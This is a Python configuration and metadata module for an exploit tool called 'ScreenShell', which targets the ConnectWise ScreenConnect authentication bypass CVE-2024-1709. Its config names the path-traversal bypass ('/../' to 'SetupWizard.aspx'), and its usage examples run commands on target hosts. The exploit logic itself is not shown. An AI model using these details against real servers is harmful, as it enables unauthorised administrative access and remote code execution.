"""
CVE-2024-1709 - ConnectWise ScreenConnect Authentication Bypass
Exploit configuration and metadata
"""

from dataclasses import dataclass
from typing import List
from datetime import datetime


@dataclass
class CVEMetadata:
    """CVE vulnerability metadata"""
    cve_id: str
    title: str
    description: str
    severity: str
    cvss_score: float
    published_date: datetime
    affected_products: List[str]
    references: List[str]
    
    def to_dict(self):
        return {
            'cveId': self.cve_id,
            'title': self.title,
            'description': self.description,
            'severity': self.severity,
            'cvssScore': str(self.cvss_score),
            'publishedDate': self.published_date.isoformat(),
            'affectedProducts': self.affected_products,
            'references': self.references
        }


@dataclass
class ToolMetadata:
    """Exploit tool metadata"""
    tool_name: str
    version: str
    exploit_name: str
    language: str
    author: str
    website: str
    profile: str
    
    def to_dict(self):
        return {
            'name': self.tool_name,
            'version': self.version,
            'exploitName': self.exploit_name,
            'language': self.language,
            'author': self.author
        }


# CVE Information
CVE = CVEMetadata(
    cve_id="CVE-2024-1709",
    title="ConnectWise ScreenConnect Authentication Bypass to RCE",
    description=(
        "A critical authentication bypass vulnerability in ConnectWise ScreenConnect "
        "that allows attackers to gain administrative access without credentials. "
        "The flaw enables path traversal attacks that bypass authentication checks, "
        "leading to unauthorized access, data extraction, and remote code execution "
        "through file upload capabilities."
    ),
    severity="CRITICAL",
    cvss_score=10.0,
    published_date=datetime(2024, 2, 21),
    affected_products=[
        "ConnectWise ScreenConnect 23.9.7 and earlier",
        "ConnectWise Control (all versions < 23.9.8)"
    ],
    references=[
        "https://nvd.nist.gov/vuln/detail/CVE-2024-1709",
        "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8",
        "https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass"
    ]
)


# Tool Information
TOOL = ToolMetadata(
    tool_name="CVE-2024-1709 ScreenConnect Exploit",
    version="1.0",
    exploit_name="ScreenShell",
    language="python",
    author="Moovendhan V",
    website="www.cybertechmind.com",
    profile="profile.cybertechmind.com"
)


# ASCII Art Banner
ASCII_ART = """
▄▀▀ ▄▀▀ █▀▄ ██▀ ██▀ █▄ █ ▄▀▀ █▄█ ██▀ █   █  
▄██ ▀▄▄ █▀▄ █▄▄ █▄▄ █ ▀█ ▀▄▄ █ █ █▄▄ █▄▄ █▄▄
"""


# Usage Examples
USAGE_EXAMPLES = """
Examples:
  exploit.py -t https://screenconnect.target.com -c "whoami"
  exploit.py -t https://remote.company.com:8040 -c "id"
  exploit.py -t https://sc.vulnerable.com -c "hostname"
"""


# POC Database Entry
POC_METADATA = {
    'name': 'ScreenShell - CVE-2024-1709 Exploit',
    'description': (
        'Automated exploitation tool for CVE-2024-1709. Bypasses authentication in '
        'ConnectWise ScreenConnect via path traversal, gains admin access, and '
        'achieves remote code execution through extension upload.'
    ),
    'language': 'python',
    'usageExamples': USAGE_EXAMPLES.strip(),
    'author': TOOL.author
}


# Exploitation Configuration
EXPLOIT_CONFIG = {
    'timeout': 15,
    'default_protocol': 'https',
    'bypass_path': '/../',
    'admin_endpoint': 'SetupWizard.aspx',
    'user_agent_template': '{author}-Scanner/{version}',
    'verify_ssl': False
}


__all__ = ['CVE', 'TOOL', 'ASCII_ART', 'USAGE_EXAMPLES', 'POC_METADATA', 'EXPLOIT_CONFIG']


def get_full_metadata():
    return {
        'cve': CVE.to_dict(),
        'tool': TOOL.to_dict(),
        'poc': POC_METADATA,
        'config': EXPLOIT_CONFIG
    }
